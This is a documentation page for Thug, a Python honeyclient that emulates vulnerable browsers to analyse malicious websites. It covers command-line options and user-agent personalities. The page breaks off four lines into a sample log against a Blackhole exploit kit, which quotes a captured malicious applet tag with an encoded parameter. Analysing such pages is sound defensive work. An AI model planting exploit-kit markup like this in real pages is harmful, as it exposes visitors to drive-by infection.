<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="./">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Usage &mdash; Thug 6.5 documentation</title>
      <link rel="stylesheet" type="text/css" href="static/pygments.css?v=fa44fd50" />
      <link rel="stylesheet" type="text/css" href="static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="static/jquery.js?v=5d32c60e"></script>
        <script src="static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="static/documentation_options.js?v=24f65cd1"></script>
        <script src="static/doctools.js?v=888ff710"></script>
        <script src="static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="static/js/theme.js"></script>
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="Thug API" href="api.html" />
    <link rel="prev" title="Configuration" href="configuration.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="index.html" class="icon icon-home">
            Thug
          </a>
              <div class="version">
                6.5
              </div>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="intro.html">Introduction</a></li>
<li class="toctree-l1"><a class="reference internal" href="build.html">Build and Install</a></li>
<li class="toctree-l1"><a class="reference internal" href="docker.html">Docker</a></li>
<li class="toctree-l1"><a class="reference internal" href="configuration.html">Configuration</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Usage</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#basic-usage">Basic usage</a></li>
<li class="toctree-l2"><a class="reference internal" href="#browser-personality">Browser personality</a></li>
<li class="toctree-l2"><a class="reference internal" href="#dom-events-handling">DOM Events Handling</a></li>
<li class="toctree-l2"><a class="reference internal" href="#adobe-acrobat-reader">Adobe Acrobat Reader</a></li>
<li class="toctree-l2"><a class="reference internal" href="#shockwave-flash">Shockwave Flash</a></li>
<li class="toctree-l2"><a class="reference internal" href="#javaplugin-and-javawebstart">JavaPlugin and JavaWebStart</a></li>
<li class="toctree-l2"><a class="reference internal" href="#proxy-support">Proxy support</a></li>
<li class="toctree-l2"><a class="reference internal" href="#image-processing">Image processing</a></li>
<li class="toctree-l2"><a class="reference internal" href="#local-analysis">Local Analysis</a></li>
<li class="toctree-l2"><a class="reference internal" href="#other-useful-features">Other useful features</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="api.html">Thug API</a></li>
<li class="toctree-l1"><a class="reference internal" href="jshooks.html">JS Hooks</a></li>
<li class="toctree-l1"><a class="reference internal" href="logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins.html">Plugin Framework</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html">Thug</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Usage</li>
      <li class="wy-breadcrumbs-aside">
            <a href="sources/usage.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="usage">
<span id="id1"></span><h1>Usage<a class="headerlink" href="#usage" title="Link to this heading"></a></h1>
<div class="toctree-wrapper compound">
</div>
<section id="basic-usage">
<h2>Basic usage<a class="headerlink" href="#basic-usage" title="Link to this heading"></a></h2>
<p>Let’s start our Thug tour by taking a look at the options it provides.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-h

Synopsis:
<span class="w">    </span>Thug:<span class="w"> </span>Pure<span class="w"> </span>Python<span class="w"> </span>honeyclient<span class="w"> </span>implementation

Usage:
<span class="w">    </span>thug<span class="w"> </span><span class="o">[</span><span class="w"> </span>options<span class="w"> </span><span class="o">]</span><span class="w"> </span>url

Options:
<span class="w">    </span>-h,<span class="w"> </span>--help<span class="w">                      </span>Display<span class="w"> </span>this<span class="w"> </span><span class="nb">help</span><span class="w"> </span>information
<span class="w">    </span>-V,<span class="w"> </span>--version<span class="w">                   </span>Display<span class="w"> </span>Thug<span class="w"> </span>version
<span class="w">    </span>-i,<span class="w"> </span>--list-ua<span class="w">                   </span>Display<span class="w"> </span>available<span class="w"> </span>user<span class="w"> </span>agents
<span class="w">    </span>-u,<span class="w"> </span>--useragent<span class="o">=</span><span class="w">                </span>Select<span class="w"> </span>a<span class="w"> </span>user<span class="w"> </span>agent<span class="w"> </span><span class="o">(</span>use<span class="w"> </span>option<span class="w"> </span>-b<span class="w"> </span><span class="k">for</span><span class="w"> </span>values,<span class="w"> </span>default:<span class="w"> </span>winxpie60<span class="o">)</span>
<span class="w">    </span>-e,<span class="w"> </span>--events<span class="o">=</span><span class="w">                   </span>Enable<span class="w"> </span>comma-separated<span class="w"> </span>specified<span class="w"> </span>DOM<span class="w"> </span>events<span class="w"> </span>handling
<span class="w">    </span>-w,<span class="w"> </span>--delay<span class="o">=</span><span class="w">                    </span>Set<span class="w"> </span>a<span class="w"> </span>maximum<span class="w"> </span>setTimeout/setInterval<span class="w"> </span>delay<span class="w"> </span>value<span class="w"> </span><span class="o">(</span><span class="k">in</span><span class="w"> </span>milliseconds<span class="o">)</span>
<span class="w">    </span>-n,<span class="w"> </span>--logdir<span class="o">=</span><span class="w">                   </span>Set<span class="w"> </span>the<span class="w"> </span>log<span class="w"> </span>output<span class="w"> </span>directory
<span class="w">    </span>-o,<span class="w"> </span>--output<span class="o">=</span><span class="w">                   </span>Log<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>specified<span class="w"> </span>file
<span class="w">    </span>-r,<span class="w"> </span>--referer<span class="w">                   </span>Specify<span class="w"> </span>a<span class="w"> </span>referer
<span class="w">    </span>-p,<span class="w"> </span>--proxy<span class="o">=</span><span class="w">                    </span>Specify<span class="w"> </span>a<span class="w"> </span>proxy<span class="w"> </span><span class="o">(</span>see<span class="w"> </span>below<span class="w"> </span><span class="k">for</span><span class="w"> </span>format<span class="w"> </span>and<span class="w"> </span>supported<span class="w"> </span>schemes<span class="o">)</span>
<span class="w">    </span>-m,<span class="w"> </span>--attachment<span class="w">                </span>Set<span class="w"> </span>the<span class="w"> </span>attachment<span class="w"> </span>mode
<span class="w">    </span>-l,<span class="w"> </span>--local<span class="w">                     </span>Analyze<span class="w"> </span>a<span class="w"> </span>locally<span class="w"> </span>saved<span class="w"> </span>page
<span class="w">    </span>-x,<span class="w"> </span>--local-nofetch<span class="w">             </span>Analyze<span class="w"> </span>a<span class="w"> </span>locally<span class="w"> </span>saved<span class="w"> </span>page<span class="w"> </span>and<span class="w"> </span>prevent<span class="w"> </span>remote<span class="w"> </span>content<span class="w"> </span>fetching
<span class="w">    </span>-v,<span class="w"> </span>--verbose<span class="w">                   </span>Enable<span class="w"> </span>verbose<span class="w"> </span>mode
<span class="w">    </span>-d,<span class="w"> </span>--debug<span class="w">                     </span>Enable<span class="w"> </span>debug<span class="w"> </span>mode
<span class="w">    </span>-q,<span class="w"> </span>--quiet<span class="w">                     </span>Disable<span class="w"> </span>console<span class="w"> </span>logging
<span class="w">    </span>-g,<span class="w"> </span>--http-debug<span class="w">                </span>Enable<span class="w"> </span>HTTP<span class="w"> </span>debug<span class="w"> </span>mode
<span class="w">    </span>-t,<span class="w"> </span>--threshold<span class="w">                 </span>Maximum<span class="w"> </span>pages<span class="w"> </span>to<span class="w"> </span>fetch
<span class="w">    </span>-j,<span class="w"> </span>--extensive<span class="w">                 </span>Extensive<span class="w"> </span>fetch<span class="w"> </span>of<span class="w"> </span>linked<span class="w"> </span>pages
<span class="w">    </span>-O,<span class="w"> </span>--connect-timeout<span class="w">           </span>Set<span class="w"> </span>the<span class="w"> </span>connect<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span><span class="k">in</span><span class="w"> </span>seconds,<span class="w"> </span>default:<span class="w"> </span><span class="m">10</span><span class="w"> </span>seconds<span class="o">)</span>
<span class="w">    </span>-T,<span class="w"> </span>--timeout<span class="o">=</span><span class="w">                  </span>Set<span class="w"> </span>the<span class="w"> </span>analysis<span class="w"> </span>timeout<span class="w"> </span><span class="o">(</span><span class="k">in</span><span class="w"> </span>seconds,<span class="w"> </span>default:<span class="w"> </span><span class="m">600</span><span class="w"> </span>seconds<span class="o">)</span>
<span class="w">    </span>-c,<span class="w"> </span>--broken-url<span class="w">                </span>Set<span class="w"> </span>the<span class="w"> </span>broken<span class="w"> </span>URL<span class="w"> </span>mode
<span class="w">    </span>-z,<span class="w"> </span>--web-tracking<span class="w">              </span>Enable<span class="w"> </span>web<span class="w"> </span>client<span class="w"> </span>tracking<span class="w"> </span>inspection
<span class="w">    </span>-b,<span class="w"> </span>--async-prefetch<span class="w">            </span>Enable<span class="w"> </span>async<span class="w"> </span>prefetching<span class="w"> </span>mode
<span class="w">    </span>-k,<span class="w"> </span>--no-honeyagent<span class="w">             </span>Disable<span class="w"> </span>HoneyAgent<span class="w"> </span>support
<span class="w">    </span>-a,<span class="w"> </span>--image-processing<span class="w">          </span>Enable<span class="w"> </span>image<span class="w"> </span>processing<span class="w"> </span>analysis
<span class="w">    </span>-E,<span class="w"> </span>--awis<span class="w">                      </span>Enable<span class="w"> </span>AWS<span class="w"> </span>Alexa<span class="w"> </span>Web<span class="w"> </span>Information<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>AWIS<span class="o">)</span>

<span class="w">    </span>Plugins:
<span class="w">    </span>-A,<span class="w"> </span>--adobepdf<span class="o">=</span><span class="w">                 </span>Specify<span class="w"> </span>the<span class="w"> </span>Adobe<span class="w"> </span>Acrobat<span class="w"> </span>Reader<span class="w"> </span>version<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span><span class="m">9</span>.1.0<span class="o">)</span>
<span class="w">    </span>-P,<span class="w"> </span>--no-adobepdf<span class="w">               </span>Disable<span class="w"> </span>Adobe<span class="w"> </span>Acrobat<span class="w"> </span>Reader<span class="w"> </span>plugin
<span class="w">    </span>-S,<span class="w"> </span>--shockwave<span class="o">=</span><span class="w">                </span>Specify<span class="w"> </span>the<span class="w"> </span>Shockwave<span class="w"> </span>Flash<span class="w"> </span>version<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span><span class="m">10</span>.0.64.0<span class="o">)</span>
<span class="w">    </span>-R,<span class="w"> </span>--no-shockwave<span class="w">              </span>Disable<span class="w"> </span>Shockwave<span class="w"> </span>Flash<span class="w"> </span>plugin
<span class="w">    </span>-J,<span class="w"> </span>--javaplugin<span class="o">=</span><span class="w">               </span>Specify<span class="w"> </span>the<span class="w"> </span>JavaPlugin<span class="w"> </span>version<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span><span class="m">1</span>.6.0.32<span class="o">)</span>
<span class="w">    </span>-K,<span class="w"> </span>--no-javaplugin<span class="w">             </span>Disable<span class="w"> </span>Java<span class="w"> </span>plugin
<span class="w">    </span>-L,<span class="w"> </span>--silverlight<span class="w">               </span>Specify<span class="w"> </span>SilverLight<span class="w"> </span>version<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span><span class="m">4</span>.0.50826.0<span class="o">)</span>
<span class="w">    </span>-N,<span class="w"> </span>--no-silverlight<span class="w">            </span>Disable<span class="w"> </span>SilverLight<span class="w"> </span>plugin

<span class="w">    </span>Classifiers:
<span class="w">    </span>--htmlclassifier<span class="o">=</span><span class="w">               </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>HTML<span class="w"> </span>classifier<span class="w"> </span>rule<span class="w"> </span>files
<span class="w">    </span>--urlclassifier<span class="o">=</span><span class="w">                </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>URL<span class="w"> </span>classifier<span class="w"> </span>rule<span class="w"> </span>files
<span class="w">    </span>--jsclassifier<span class="o">=</span><span class="w">                 </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>JS<span class="w"> </span>classifier<span class="w"> </span>rule<span class="w"> </span>files
<span class="w">    </span>--vbsclassifier<span class="o">=</span><span class="w">                </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>VBS<span class="w"> </span>classifier<span class="w"> </span>rule<span class="w"> </span>files
<span class="w">    </span>--sampleclassifier<span class="o">=</span><span class="w">             </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>sample<span class="w"> </span>classifier<span class="w"> </span>rule<span class="w"> </span>files
<span class="w">    </span>--htmlfilter<span class="o">=</span><span class="w">                   </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>HTML<span class="w"> </span>filter<span class="w"> </span>files
<span class="w">    </span>--urlfilter<span class="o">=</span><span class="w">                    </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>URL<span class="w"> </span>filter<span class="w"> </span>files
<span class="w">    </span>--jsfilter<span class="o">=</span><span class="w">                     </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>JS<span class="w"> </span>filter<span class="w"> </span>files
<span class="w">    </span>--vbsfilter<span class="o">=</span><span class="w">                    </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>VBS<span class="w"> </span>filter<span class="w"> </span>files
<span class="w">    </span>--samplefilter<span class="o">=</span><span class="w">                 </span>Specify<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>additional<span class="w"> </span><span class="o">(</span>comma<span class="w"> </span>separated<span class="o">)</span><span class="w"> </span>sample<span class="w"> </span>filter<span class="w"> </span>files

<span class="w">    </span>Logging:
<span class="w">    </span>-F,<span class="w"> </span>--file-logging<span class="w">              </span>Enable<span class="w"> </span>file<span class="w"> </span>logging<span class="w"> </span>mode<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span>disabled<span class="o">)</span>
<span class="w">    </span>-Z,<span class="w"> </span>--json-logging<span class="w">              </span>Enable<span class="w"> </span>JSON<span class="w"> </span>logging<span class="w"> </span>mode<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span>disabled<span class="o">)</span>
<span class="w">    </span>-G,<span class="w"> </span>--elasticsearch-logging<span class="w">     </span>Enable<span class="w"> </span>ElasticSearch<span class="w"> </span>logging<span class="w"> </span>mode<span class="w"> </span><span class="o">(</span>default:<span class="w"> </span>disabled<span class="o">)</span>
<span class="w">    </span>-D,<span class="w"> </span>--mongodb-address<span class="o">=</span><span class="w">          </span>Specify<span class="w"> </span>address<span class="w"> </span>and<span class="w"> </span>port<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>MongoDB<span class="w"> </span>instance<span class="w"> </span><span class="o">(</span>format:<span class="w"> </span>host:port<span class="o">)</span>
<span class="w">    </span>-Y,<span class="w"> </span>--no-code-logging<span class="w">           </span>Disable<span class="w"> </span>code<span class="w"> </span>logging
<span class="w">    </span>-U,<span class="w"> </span>--no-cert-logging<span class="w">           </span>Disable<span class="w"> </span>SSL/TLS<span class="w"> </span>certificate<span class="w"> </span>logging

Proxy<span class="w"> </span>Format:
<span class="w">    </span>scheme://<span class="o">[</span>username:password@<span class="o">]</span>host:port<span class="w"> </span><span class="o">(</span>supported<span class="w"> </span>schemes:<span class="w"> </span>http,<span class="w"> </span>socks4,<span class="w"> </span>socks5,<span class="w"> </span>socks5h<span class="o">)</span>
</pre></div>
</div>
<p>Before diving deep into details let’s take a look at the available personalities</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>thug<span class="w"> </span>--list-ua

Synopsis:
<span class="w">    </span>Thug:<span class="w"> </span>Pure<span class="w"> </span>Python<span class="w"> </span>honeyclient<span class="w"> </span>implementation

Available<span class="w"> </span>User-Agents:
<span class="w">            </span>winxpie60<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">6</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpie61<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">6</span>.1<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpie70<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">7</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpie80<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">8</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpchrome20<span class="w">         </span>Chrome<span class="w"> </span><span class="m">20</span>.0.1132.47<span class="w">       </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpfirefox12<span class="w">        </span>Firefox<span class="w"> </span><span class="m">12</span>.0<span class="w">              </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>winxpsafari5<span class="w">          </span>Safari<span class="w"> </span><span class="m">5</span>.1.7<span class="w">              </span><span class="o">(</span>Windows<span class="w"> </span>XP<span class="o">)</span>
<span class="w">            </span>win2kie60<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">6</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">2000</span><span class="o">)</span>
<span class="w">            </span>win2kie80<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">8</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">2000</span><span class="o">)</span>
<span class="w">            </span>win7ie80<span class="w">              </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">8</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7ie90<span class="w">              </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">9</span>.0<span class="w">     </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7ie100<span class="w">             </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">10</span>.0<span class="w">    </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7chrome20<span class="w">          </span>Chrome<span class="w"> </span><span class="m">20</span>.0.1132.47<span class="w">       </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7chrome40<span class="w">          </span>Chrome<span class="w"> </span><span class="m">40</span>.0.2214.91<span class="w">       </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7chrome45<span class="w">          </span>Chrome<span class="w"> </span><span class="m">45</span>.0.2454.85<span class="w">       </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7chrome49<span class="w">          </span>Chrome<span class="w"> </span><span class="m">49</span>.0.2623.87<span class="w">       </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7firefox3<span class="w">          </span>Firefox<span class="w"> </span><span class="m">3</span>.6.13<span class="w">            </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win7safari5<span class="w">           </span>Safari<span class="w"> </span><span class="m">5</span>.1.7<span class="w">              </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="o">)</span>
<span class="w">            </span>win10ie110<span class="w">            </span>Internet<span class="w"> </span>Explorer<span class="w"> </span><span class="m">11</span>.0<span class="w">    </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">10</span><span class="o">)</span>
<span class="w">            </span>osx10chrome19<span class="w">         </span>Chrome<span class="w"> </span><span class="m">19</span>.0.1084.54<span class="w">       </span><span class="o">(</span>MacOS<span class="w"> </span>X<span class="w"> </span><span class="m">10</span>.7.4<span class="o">)</span>
<span class="w">            </span>osx10chrome80<span class="w">         </span>Chrome<span class="w"> </span><span class="m">80</span>.0.3987.116<span class="w">      </span><span class="o">(</span>MacOS<span class="w"> </span>X<span class="w"> </span><span class="m">10</span>.15.3<span class="o">)</span>
<span class="w">            </span>osx10safari5<span class="w">          </span>Safari<span class="w"> </span><span class="m">5</span>.1.1<span class="w">              </span><span class="o">(</span>MacOS<span class="w"> </span>X<span class="w"> </span><span class="m">10</span>.7.2<span class="o">)</span>
<span class="w">            </span>linuxchrome26<span class="w">         </span>Chrome<span class="w"> </span><span class="m">26</span>.0.1410.19<span class="w">       </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>linuxchrome30<span class="w">         </span>Chrome<span class="w"> </span><span class="m">30</span>.0.1599.15<span class="w">       </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>linuxchrome44<span class="w">         </span>Chrome<span class="w"> </span><span class="m">44</span>.0.2403.89<span class="w">       </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>linuxchrome54<span class="w">         </span>Chrome<span class="w"> </span><span class="m">54</span>.0.2840.100<span class="w">      </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>linuxfirefox19<span class="w">        </span>Firefox<span class="w"> </span><span class="m">19</span>.0<span class="w">              </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>linuxfirefox40<span class="w">        </span>Firefox<span class="w"> </span><span class="m">40</span>.0<span class="w">              </span><span class="o">(</span>Linux<span class="o">)</span>
<span class="w">            </span>galaxy2chrome18<span class="w">       </span>Chrome<span class="w"> </span><span class="m">18</span>.0.1025.166<span class="w">      </span><span class="o">(</span>Samsung<span class="w"> </span>Galaxy<span class="w"> </span>S<span class="w"> </span>II,<span class="w"> </span>Android<span class="w"> </span><span class="m">4</span>.0.3<span class="o">)</span>
<span class="w">            </span>galaxy2chrome25<span class="w">       </span>Chrome<span class="w"> </span><span class="m">25</span>.0.1364.123<span class="w">      </span><span class="o">(</span>Samsung<span class="w"> </span>Galaxy<span class="w"> </span>S<span class="w"> </span>II,<span class="w"> </span>Android<span class="w"> </span><span class="m">4</span>.0.3<span class="o">)</span>
<span class="w">            </span>galaxy2chrome29<span class="w">       </span>Chrome<span class="w"> </span><span class="m">29</span>.0.1547.59<span class="w">       </span><span class="o">(</span>Samsung<span class="w"> </span>Galaxy<span class="w"> </span>S<span class="w"> </span>II,<span class="w"> </span>Android<span class="w"> </span><span class="m">4</span>.1.2<span class="o">)</span>
<span class="w">            </span>nexuschrome18<span class="w">         </span>Chrome<span class="w"> </span><span class="m">18</span>.0.1025.133<span class="w">      </span><span class="o">(</span>Google<span class="w"> </span>Nexus,<span class="w"> </span>Android<span class="w"> </span><span class="m">4</span>.0.4<span class="o">)</span>
<span class="w">            </span>ipadchrome33<span class="w">          </span>Chrome<span class="w"> </span><span class="m">33</span>.0.1750.21<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">7</span>.1<span class="o">)</span>
<span class="w">            </span>ipadchrome35<span class="w">          </span>Chrome<span class="w"> </span><span class="m">35</span>.0.1916.41<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">7</span>.1.1<span class="o">)</span>
<span class="w">            </span>ipadchrome37<span class="w">          </span>Chrome<span class="w"> </span><span class="m">37</span>.0.2062.52<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">7</span>.1.2<span class="o">)</span>
<span class="w">            </span>ipadchrome38<span class="w">          </span>Chrome<span class="w"> </span><span class="m">38</span>.0.2125.59<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">8</span>.0.2<span class="o">)</span>
<span class="w">            </span>ipadchrome39<span class="w">          </span>Chrome<span class="w"> </span><span class="m">39</span>.0.2171.45<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">8</span>.1.1<span class="o">)</span>
<span class="w">            </span>ipadchrome45<span class="w">          </span>Chrome<span class="w"> </span><span class="m">45</span>.0.2454.68<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">8</span>.4.1<span class="o">)</span>
<span class="w">            </span>ipadchrome46<span class="w">          </span>Chrome<span class="w"> </span><span class="m">46</span>.0.2490.73<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">9</span>.0.2<span class="o">)</span>
<span class="w">            </span>ipadchrome47<span class="w">          </span>Chrome<span class="w"> </span><span class="m">47</span>.0.2526.70<span class="w">       </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">9</span>.1<span class="o">)</span>
<span class="w">            </span>ipadsafari7<span class="w">           </span>Safari<span class="w"> </span><span class="m">7</span>.0<span class="w">                </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">7</span>.0.4<span class="o">)</span>
<span class="w">            </span>ipadsafari8<span class="w">           </span>Safari<span class="w"> </span><span class="m">8</span>.0<span class="w">                </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">8</span>.0.2<span class="o">)</span>
<span class="w">            </span>ipadsafari9<span class="w">           </span>Safari<span class="w"> </span><span class="m">9</span>.0<span class="w">                </span><span class="o">(</span>iPad,<span class="w"> </span>iOS<span class="w"> </span><span class="m">9</span>.1<span class="o">)</span>
</pre></div>
</div>
<p>Let’s start with a first basic real-world example: a Blackhole exploit kit.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="linenos"> 1</span><span class="w">       </span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span><span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="linenos"> 2</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:20<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="linenos"> 3</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:20<span class="o">]</span><span class="w"> </span>&lt;applet<span class="w"> </span><span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span><span class="w"> </span><span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="linenos"> 4</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:20<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>Ryp.jar<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
